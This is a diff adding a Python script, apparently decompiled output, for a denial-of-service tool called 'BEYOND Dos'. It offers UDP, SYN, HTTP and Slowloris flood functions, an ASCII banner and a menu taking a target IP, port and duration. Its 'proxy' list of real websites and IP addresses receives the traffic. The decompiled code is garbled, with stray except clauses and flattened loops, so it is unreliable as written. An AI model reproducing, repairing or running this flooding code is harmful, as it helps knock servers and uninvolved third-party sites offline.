@@ -1,0 +1,150 @@
+import socket
+import random
+import time
+import sys
+import os
+import threading
+def set_title(title):
+    if os.name == 'nt':
+        import ctypes
+        ctypes.windll.kernel32.SetConsoleTitleW(title)
+    else:
+        sys.stdout.write(f']0;{title}\a')
+        sys.stdout.flush()
+def udp_flood(target_ip, target_port, duration, proxy):
+    # irreducible cflow, using cdg fallback
+    # ***<module>.udp_flood: Failure: Compilation Error
+    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_socket.settimeout(5)
+    end_time = time.time() + duration
+    packets_sent = 0
+    if time.time() < end_time:
+        pass
+    bytes_data = random._urandom(1024)
+    udp_socket.sendto(bytes_data, (proxy[0], target_port))
+    packets_sent += 1
+    print(f'Sent UDP packet to {proxy[0]}:{target_port} [Total packets sent: {packets_sent}]')
+    udp_socket.close()
+    except KeyboardInterrupt:
+        pass
+    print('Attack stopped by user (CTRL + C)')
+    except socket.timeout:
+        pass
+    print('Proxy connection timed out')
+def syn_flood(target_ip, target_port, duration, proxy):
+    # irreducible cflow, using cdg fallback
+    # ***<module>.syn_flood: Failure: Compilation Error
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+    end_time = time.time() + duration
+    packets_sent = 0
+    if time.time() < end_time:
+        pass
+    sock.connect((proxy[0], target_port))
+    sock.send(b'GET / HTTP/1.1\r\n')
+    sock.send(b'Host: ' + target_ip.encode() + b'\r\n\r\n')
+    sock.close()
+    packets_sent += 1
+    print(f'Sent SYN packet to {proxy[0]}:{target_port} [Total packets sent: {packets_sent}]')
+    sock.close()
+    except KeyboardInterrupt:
+        pass
+    print('Attack stopped by user (CTRL + C)')
+    except socket.timeout:
+        pass
+    print('Proxy connection timed out')
+def http_flood(target_ip, target_port, duration, proxy):
+    # irreducible cflow, using cdg fallback
+    # ***<module>.http_flood: Failure: Compilation Error
+    headers = f'GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n'
+    end_time = time.time() + duration
+    packets_sent = 0
+    if time.time() < end_time:
+        pass
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+    sock.connect((proxy[0], target_port))
+    sock.sendall(headers.encode())
+    sock.close()
+    packets_sent += 1
+    print(f'Sent HTTP packet to {proxy[0]}:{target_port} [Total packets sent: {packets_sent}]')
+    sock.close()
+    except KeyboardInterrupt:
+        pass
+    print('Attack stopped by user (CTRL + C)')
+    except socket.timeout:
+        pass
+    print('Proxy connection timed out')
+def slowloris(target_ip, target_port, duration, proxy):
+    # irreducible cflow, using cdg fallback
+    # ***<module>.slowloris: Failure: Compilation Error
+    headers = f'GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nConnection: keep-alive\r\n\r\n'
+    end_time = time.time() + duration
+    packets_sent = 0
+    if time.time() < end_time:
+        pass
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+    sock.connect((proxy[0], target_port))
+    sock.sendall(headers.encode())
+    time.sleep(15)
+    packets_sent += 1
+    print(f'Sent Slowloris packet to {proxy[0]}:{target_port} [Total packets sent: {packets_sent}]')
+    sock.close()
+    except KeyboardInterrupt:
+        pass
+    print('Attack stopped by user (CTRL + C)')
+    except socket.timeout:
+        pass
+    print('Proxy connection timed out')
+plane = '[32m\n$$$$$$$\\  $$$$$$$$\\ $$\\     $$\\  $$$$$$\\  $$\\   $$\\ $$$$$$$$$  __$$\\ $$  _____|\\$$\\   $$  |$$  __$$\\ $$$\\  $$ |$$  __$$\\       \n$$ |  $$ |$$ |       \\$$\\ $$  / $$ /  $$ |$$$$\\ $$ |$$ |  $$ |      \n$$$$$$$\\ |$$$$$\\      \\$$$$  /  $$ |  $$ |$$ $$\\$$ |$$ |  $$ |      \n$$  __$$\\ $$  __|      \\$$  /   $$ |  $$ |$$ \\$$$$ |$$ |  $$ |      \n$$ |  $$ |$$ |          $$ |    $$ |  $$ |$$ |\\$$$ |$$ |  $$ |          \n$$$$$$$  |$$$$$$$$\\     $$ |     $$$$$$  |$$ | \\$$ |$$$$$$$  |      \n\\_______/ \\________|    \\__|     \\______/ \\__|  \\__|\\_______/        \n'
+commands = '\n\t udp       <ip> <port> <duration>\n\t syn       <ip> <port> <duration>\n\t http      <ip> <port> <duration>\n\t slowloris <ip> <port> <duration>\n'
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+def main():
+    # irreducible cflow, using cdg fallback
+    # ***<module>.main: Failure: Compilation Error
+    set_title('BEYOND Dos: ')
+    for _ in range(50):
+        for line in plane.split('\n'):
+            print(' ' * (_ % (1000 * len(plane.split('\n')[0]))) + line)
+        time.sleep(0.05)
+        clear()
+    clear()
+    print('[32m' + plane + '[0m')
+    print(commands)
+    proxies = [('www.google.com', 80), ('www.wikipedia.org', 80), ('www.youtube.com', 80), ('www.bbc.com', 80), ('www.stanford.edu', 80), ('www.mit.edu', 80), ('www.nytimes.com', 80), ('www.reddit.com', 80), ('www.nationalgeographic.com', 80), ('www.nature.com', 80), ('108.162.192.147', 80), ('108.162.192.134', 80), ('108.162.192.0', 80), ('102.177.176.108', 80), ('108.162.192.10', 80), ('1.0.171.213', 80), ('1.1.189.58', 80), ('102.177.176.109', 80), ('108.162.192.12', 80), ('108.162.192.116', 80), ('101.255.166.58', 80), ('1.161.194.81', 80), ('108.162.192.113', 80), ('1.54.172.229', 80), ('1.52.198.221', 80)]
+    cmd = input('BEYOND Dos').split()
+    if cmd:
+        pass
+    if cmd[0] in {'?', 'help'}:
+        pass
+    print(commands)
+    continue
+    if cmd[0] == 'clear':
+        pass
+    clear()
+    continue
+    if cmd[0] == 'udp' and len(cmd) == 4:
+        pass
+    proxy = random.choice(proxies)
+    threading.Thread(target=udp_flood, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
+    if cmd[0] == 'syn' and len(cmd) == 4:
+        pass
+    proxy = random.choice(proxies)
+    threading.Thread(target=syn_flood, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
+    if cmd[0] == 'http' and len(cmd) == 4:
+        pass
+    proxy = random.choice(proxies)
+    threading.Thread(target=http_flood, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
+    if cmd[0] == 'slowloris' and len(cmd) == 4:
+        pass
+    proxy = random.choice(proxies)
+    threading.Thread(target=slowloris, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
+    print('Invalid command or incorrect number of arguments')
+    except KeyboardInterrupt:
+        pass
+    print('Exiting Beyond Dos...')
+    sys.exit(0)
+if __name__ == '__main__':
+    main()
